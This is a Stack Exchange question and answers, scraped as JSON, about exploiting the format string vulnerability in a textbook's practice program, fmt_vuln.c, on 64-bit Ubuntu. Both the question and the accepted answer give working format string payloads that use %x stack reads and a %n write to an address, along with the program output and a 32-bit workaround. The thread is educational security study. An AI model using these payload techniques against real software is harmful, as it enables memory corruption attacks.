{
    "title": "Unable to exploit format string vulenrability on Ubuntu 18.04.2 LTS",
    "link": "https://reverseengineering.stackexchange.com/questions/21765/unable-to-exploit-format-string-vulenrability-on-ubuntu-18-04-2-lts",
    "content": "I am studying from \"Hacking: The Art of Exploitation\" and in program fmt_vuln.c format string is exploited. I am getting <pre><code>Segmentation Fault</code></pre> error.\nChecking position of <pre><code>AAAA</code></pre> on stack:\n<pre><code>$ ./fmt_vuln AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x\nThe right way to print user-controlled input:\nAAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x\nThe wrong way to print user-controlled input:\nAAAA55756260.f7dd18c0.f7af4154.00000000.f7b523a0.ffffdfe8.ffffdb30.41414141\n[*] test_val @ 0x555555755010 = -72 0xffffffb8\n</code></pre>\nWiting to <pre><code>test_value</code></pre> address\n<pre><code>$ ./fmt_vuln $(printf \"\\x10\\x50\\x75\\x55\")%08x.%08x.%08x.%08x.%08x.%08x.%08x.%n\nThe right way to print user-controlled input:\n\u0010PuU%08x.%08x.%08x.%08x.%08x.%08x.%08x.%n\nThe wrong way to print user-controlled input:\nSegmentation fault (core dumped)\n</code></pre>\nAs suggested in this answer I have disabled ASLR and compiled without stack protection.\n",
    "votes": "0",
    "answers": 2,
    "views": "313",
    "tags": [
        "linux",
        "c",
        "exploit"
    ],
    "user": "coder",
    "time": "Jul 25, 2019 at 7:50",
    "comments": [
        {
            "user": "Ricardo",
            "text": "Maybe stack canaries?\n",
            "time": null
        },
        {
            "user": "Chris Stratton",
            "text": "Questions on Stack Exchange sites must stand on their own; as this is in effect a debugging question it must include the actual code directly, not as a link.\n",
            "time": null
        }
    ],
    "answers_data": [
        {
            "content": "As @Chris Stratton already said, you don't give the right pointer value - you want to put <pre><code>\\x10\\x50\\x75\\x55\\x55\\x55\\x00\\x00</code></pre> as that value. Your segfault comes from instruction:\n<pre><code>mov dword [rax], r13d\n</code></pre>\nwhere <pre><code>rax</code></pre> = <pre><code>0x7838302555755010</code></pre>, which confirms that you need to put these <pre><code>4</code></pre> extra bytes (to overwrite <pre><code>78383025</code></pre> part). I do not know however how you can pass <pre><code>NULL</code></pre> bytes in bash as an argument.\nAs a workaround, you can compile this program for <pre><code>32</code></pre>bit architecture using <pre><code>-m32</code></pre> option in GCC. Then use:\n<pre><code>./fmt_vuln AAAA%08x.%08x.%08x.%08x\n</code></pre>\nto get:\n<pre><code>[*] test_val @ 0x56557008 = -72 0xffffffb8\n</code></pre>\nand then:\n<pre><code>./fmt_vuln $(printf \"\\x08\\x70\\x55\\x56\")%08x.%08x.%08x.%n\n</code></pre>\nand finally you get:\n<pre><code>[*] test_val @ 0x56557008 = 31 0x0000001f\n</code></pre>\nNote: when in doubt, just run your program in a debugger (I used radare2 for instance) - this way you can get the instruction causing segfault and you can see register values at that moment.\n",
            "votes": "1",
            "user": "bart1e",
            "time": "Jul 26, 2019 at 20:24",
            "is_accepted": true,
            "comments": []
        },
        {
            "content": "[*] test_val @ 0x555555755010 = -72 0xffffffb8\n\nThis shows us that you are on a 64 bit system.\n\n$ ./fmt_vuln $(printf \"\\x10\\x50\\x75\\x55\")%08x.%08x.%08x.%08x.%08x.%08x.%08x.%n\n\nYet you attempt to supply only the low 32-bits as your pointer value.  Whatever the value of the other 32-bits, they are overwhelmingly likely to be part of an invalid address.\nThis may not be the only thing wrong, but by itself it is a clear mistake.\n",
            "votes": "0",
            "user": "Chris Stratton",
            "time": "Jul 26, 2019 at 18:55",
            "is_accepted": false,
            "comments": []
        }
    ]
}